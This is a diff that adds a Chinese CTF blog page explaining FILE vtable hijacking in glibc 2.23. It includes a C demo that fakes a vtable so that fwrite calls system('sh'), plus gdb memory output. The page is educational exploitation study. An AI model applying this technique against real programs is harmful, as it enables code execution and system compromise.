@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.mark0519.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="IO_FILE 伪造vtable在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn-IO_FILE-伪造vtable">
+<meta property="og:url" content="https://blog.mark0519.com/post/pwn-IO-FILE-%E4%BC%AA%E9%80%A0vtable.html">
+<meta property="og:site_name" content="Mark&#39;s blog">
+<meta property="og:description" content="IO_FILE 伪造vtable在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.imgdb.cn/item/60f00aa75132923bf87dc5bd.jpg">
+<meta property="article:published_time" content="2021-07-15T07:38:14.000Z">
+<meta property="article:modified_time" content="2021-11-21T14:16:17.703Z">
+<meta property="article:author" content="Mark0519">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="python2">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/60f00aa75132923bf87dc5bd.jpg">
+
+<link rel="canonical" href="https://blog.mark0519.com/post/pwn-IO-FILE-%E4%BC%AA%E9%80%A0vtable.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>pwn-IO_FILE-伪造vtable | Mark's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mark's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.mark0519.com/post/pwn-IO-FILE-%E4%BC%AA%E9%80%A0vtable.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic.imgdb.cn/item/5fbd287eb18d627113535cf8.png">
+      <meta itemprop="name" content="Mark0519">
+      <meta itemprop="description" content="菜鸡CTFer的自留地">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mark's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwn-IO_FILE-伪造vtable
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-07-15 15:38:14" itemprop="dateCreated datePublished" datetime="2021-07-15T15:38:14+08:00">2021-07-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-21 22:16:17" itemprop="dateModified" datetime="2021-11-21T22:16:17+08:00">2021-11-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="IO-FILE-伪造vtable"><a href="#IO-FILE-伪造vtable" class="headerlink" title="IO_FILE 伪造vtable"></a>IO_FILE 伪造vtable</h1><p>在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</p>
+<span id="more"></span>
+
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>上一篇文章系统总结了下 Linux 中文件流的特性（FILE），可以得知 Linux 中的一些常见的 IO 操作函数都需要经过 FILE 结构进行处理。尤其是_IO_FILE_plus 结构中存在 vtable，一些函数会取出 vtable 中的指针进行调用。</p>
+<p>因此伪造 vtable 劫持程序流程的中心思想就是针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。</p>
+<p>因此 vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向可以控制的内存，然后在其中布置函数指针。</p>
+<p>本文是基于libc 2.23及之前的libc上可实施的，libc2.24之后加入了vtable check机制，无法再构造vtable。</p>
+<p>vtable是<code>_IO_FILE_plus</code>结构体里的一个字段，是一个函数表指针，里面存储着许多和IO相关的函数。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><code>_IO_FILE_plus</code>结构体的定义为：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span>
+<span class="token punctuation">&#123;</span>
+  _IO_FILE file<span class="token punctuation">;</span>
+  <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> <span class="token operator">*</span>vtable<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>vtable</code>对应的结构体<code>_IO_jump_t</code>的定义为：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">,</span> __dummy<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">,</span> __dummy2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_finish_t<span class="token punctuation">,</span> __finish<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_overflow_t<span class="token punctuation">,</span> __overflow<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">,</span> __underflow<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">,</span> __uflow<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_pbackfail_t<span class="token punctuation">,</span> __pbackfail<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">/* showmany */</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_xsputn_t<span class="token punctuation">,</span> __xsputn<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_xsgetn_t<span class="token punctuation">,</span> __xsgetn<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seekoff_t<span class="token punctuation">,</span> __seekoff<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seekpos_t<span class="token punctuation">,</span> __seekpos<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_setbuf_t<span class="token punctuation">,</span> __setbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_sync_t<span class="token punctuation">,</span> __sync<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_doallocate_t<span class="token punctuation">,</span> __doallocate<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_read_t<span class="token punctuation">,</span> __read<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_write_t<span class="token punctuation">,</span> __write<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seek_t<span class="token punctuation">,</span> __seek<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_close_t<span class="token punctuation">,</span> __close<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_stat_t<span class="token punctuation">,</span> __stat<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_showmanyc_t<span class="token punctuation">,</span> __showmanyc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_imbue_t<span class="token punctuation">,</span> __imbue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token number">0</span></span></span>
+    get_column<span class="token punctuation">;</span>
+    set_column<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这个函数表中有19个函数，分别完成IO相关的功能，由IO函数调用，如<code>fwrite</code>最终会调用<code>__write</code>函数、<code>fread</code>会调用<code>__doallocate</code>来分配IO缓冲区等。</p>
+<p><strong>vtable劫持的原理是：如果能够控制FILE结构体，实现对vtable指针的修改，使得vtable指向可控的内存，在该内存中构造好vtable，再通过调用相应IO函数，触发vtable函数的调用，即可劫持程序执行流。</strong></p>
+<p>从原理中可以看到，劫持最关键的点在于修改IO FILE结构体的vtable指针，指向可控内存。一般来说有两种方式：一种是只修改内存中已有FILE结构体的vtable字段；另一种则是伪造整个FILE结构体。当然，两种的本质最终都是修改了vtable字段。</p>
+<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>这里演示了修改 vtable 中的指针，首先需要知道_IO_FILE_plus 位于哪里，<strong>对于 fopen 的情况下是位于堆内存，对于 stdin\stdout\stderr 是位于 libc.so 中。</strong></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">system_ptr</span> <span class="token expression"><span class="token number">0x7ffff7a523a0</span><span class="token punctuation">;</span></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>
+    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>vtable_addr<span class="token punctuation">,</span><span class="token operator">*</span>fake_vtable<span class="token punctuation">;</span>
+
+    fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"123.txt"</span><span class="token punctuation">,</span><span class="token string">"rw"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    fake_vtable<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    vtable_addr<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>fp<span class="token operator">+</span><span class="token number">0xd8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//vtable offset</span>
+
+    vtable_addr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>fake_vtable<span class="token punctuation">;</span>
+
+    <span class="token function">memcpy</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span><span class="token string">"sh"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    fake_vtable<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span>system_ptr<span class="token punctuation">;</span> <span class="token comment">//xsputn</span>
+
+    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"hi"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们首先分配一款内存来存放伪造的 vtable，之后修改_IO_FILE_plus 的 vtable 指针指向这块内存。因为 vtable 中的指针我们放置的是 system 函数的地址，因此需要传递参数 “/bin/sh” 或 “sh”。</p>
+<p>因为 vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 “sh” 写入_IO_FILE_plus 头部。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system(“sh”)。</p>
+<p>fwrite会调用xsputn，而xsputn在vtable中的第七个</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span> funcs<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+   <span class="token number">1</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// "extra word"</span>
+   <span class="token number">2</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// DUMMY</span>
+   <span class="token number">3</span> exit<span class="token punctuation">,</span> <span class="token comment">// finish</span>
+   <span class="token number">4</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// overflow</span>
+   <span class="token number">5</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// underflow</span>
+   <span class="token number">6</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// uflow</span>
+   <span class="token number">7</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// pbackfail</span>
+   
+   <span class="token number">8</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// xsputn  #printf</span>
+   <span class="token number">9</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// xsgetn</span>
+   <span class="token number">10</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// seekoff</span>
+   <span class="token number">11</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// seekpos</span>
+   <span class="token number">12</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// setbuf</span>
+   <span class="token number">13</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// sync</span>
+   <span class="token number">14</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// doallocate</span>
+   <span class="token number">15</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// read</span>
+   <span class="token number">16</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// write</span>
+   <span class="token number">17</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// seek</span>
+   <span class="token number">18</span> pwn<span class="token punctuation">,</span>  <span class="token comment">// close</span>
+   <span class="token number">19</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// stat</span>
+   <span class="token number">20</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// showmanyc</span>
+   <span class="token number">21</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// imbue</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>所以修改vtable中的xsputn为system函数</p>
+<p>同时因为 vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">vtable_addr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>fake_vtable<span class="token punctuation">;</span>
+
+<span class="token function">memcpy</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span><span class="token string">"sh"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+fake_vtable<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span>system_ptr<span class="token punctuation">;</span> <span class="token comment">//xsputn</span>
+<span class="token comment">//这里我本地的system函数地址和ctfwiki上的示例不太一样，换成我自己的地址才能跑通的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>即可getshell</p>
+<p><img src="https://pic.imgdb.cn/item/60f00aa75132923bf87dc5bd.jpg"></p>
+<p>同样，如果程序中不存在 fopen 等函数创建的_IO_FILE 时，也可以选择 stdin\stdout\stderr 等位于 libc.so 中的_IO_FILE，这些流在 printf\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">print &amp;_IO_2_1_stdin_
+$2 &#x3D; (struct _IO_FILE_plus *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;
+
+0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so
+0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so
+0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so
+0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/python2/" rel="tag"># python2</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/post/pwn-%E5%88%9D%E8%AF%86IO-FILE.html" rel="prev" title="pwn-初识IO_FILE">
+      <i class="fa fa-chevron-left"></i> pwn-初识IO_FILE
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/post/pwn-overlap-1.html" rel="next" title="pwn-overlap(1)">
+      pwn-overlap(1) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#IO-FILE-%E4%BC%AA%E9%80%A0vtable"><span class="nav-number">1.</span> <span class="nav-text">IO_FILE 伪造vtable</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E8%B7%B5"><span class="nav-number">1.3.</span> <span class="nav-text">实践</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Mark0519"
+      src="https://pic.imgdb.cn/item/5fbd287eb18d627113535cf8.png">
+  <p class="site-author-name" itemprop="name">Mark0519</p>
+  <div class="site-description" itemprop="description">菜鸡CTFer的自留地</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mark0519" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mark0519" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:sunjiajun@bupt.edu.cn" title="E-Mail → mailto:sunjiajun@bupt.edu.cn" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mark0519</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
